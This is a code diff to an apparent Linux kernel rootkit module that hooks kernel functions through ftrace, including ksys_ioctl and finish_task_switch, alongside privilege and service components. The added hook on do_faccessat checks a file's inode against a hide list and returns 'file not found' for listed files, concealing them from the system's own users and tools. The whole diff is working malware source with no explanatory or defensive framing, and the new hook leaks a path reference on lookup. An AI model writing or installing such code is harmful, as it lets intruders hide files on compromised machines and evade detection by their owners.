@@ -1,12 +1,15 @@
 #include <linux/kernel.h>
 #include <linux/sched.h>
+#include <linux/namei.h>
 #include "ftrace_helper.h"
 #include "hooks.h"
 #include "service.h"
 #include "privileges.h"
+#include "hide.h"
 
 static int (*orig_ksys_ioctl)(unsigned int fd, unsigned int cmd, unsigned long arg);
 static struct rq *(*orig_finish_task_switch)(struct task_struct *prev);
+long (*orig_do_faccessat)(int dfd, const char __user *filename, int mode);
 
 int hook_ksys_ioctl(unsigned int fd, unsigned int cmd, unsigned long arg)
 {
@@ -35,9 +38,41 @@ static struct rq *hook_finish_task_switch(struct task_struct *prev)
     return orig_finish_task_switch(prev);
 }
 
+long hook_do_faccessat(int dfd, const char __user *filename, int mode)
+{
+    struct path path;
+    int res;
+    unsigned long ino;
+    struct inode_list *entry;
+
+    // mimic lookup logic of original function
+    unsigned int lookup_flags = LOOKUP_FOLLOW;
+    
+    // perform file lookup
+    res = user_path_at(dfd, filename, lookup_flags, &path);
+    if (res)
+        goto call_orig;
+    
+    ino = path.dentry->d_inode->i_ino;
+
+    // check if inode should be hidden
+    list_for_each_entry(entry, &inodes_to_hide, list) {
+        if (entry->ino == ino) {
+            goto hide;
+        }
+    }
+
+call_orig:
+    return orig_do_faccessat(dfd, filename, mode);
+
+hide:
+    return -ENOENT;
+}
+
 static struct ftrace_hook hooks[] = {
     HOOK("ksys_ioctl", hook_ksys_ioctl, &orig_ksys_ioctl),
-    HOOK("finish_task_switch", hook_finish_task_switch, &orig_finish_task_switch)
+    HOOK("finish_task_switch", hook_finish_task_switch, &orig_finish_task_switch),
+    HOOK("do_faccessat", hook_do_faccessat, &orig_do_faccessat)
 };
 
 inline int register_hooks(void)
